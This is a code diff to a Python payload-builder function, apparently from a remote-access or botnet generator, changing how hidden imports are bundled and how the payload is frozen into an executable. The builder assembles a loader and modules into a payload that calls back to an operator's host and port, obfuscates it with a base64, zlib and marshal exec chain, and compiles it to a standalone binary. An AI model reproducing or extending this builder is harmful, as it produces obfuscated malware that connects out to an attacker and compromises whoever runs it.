@@ -282,9 +282,11 @@ def _payload(options, **kwargs):
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
 
-    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
+#    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
+    loader  = open('core/loader.py','r').read()
+    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden'])])
     modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
-    payload = '\n'.join((loader, modules))
+    payload = '\n'.join((loader, test_imports, modules))
 
     if not os.path.isdir('modules/payloads'):
         try:
@@ -417,7 +419,7 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(
 
     if options.freeze:
         util.display('\tCompiling executable...\n', color='reset', style='normal', end=' ')
-        name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
+        name = generators.freeze('modules/payloads/' + kwargs['var'] + '.py', icon=options.icon, hidden=kwargs['hidden'])
         util.display('({:,} bytes saved to file: {})\n'.format(len(open(name, 'rb').read()), name))
     return name
 
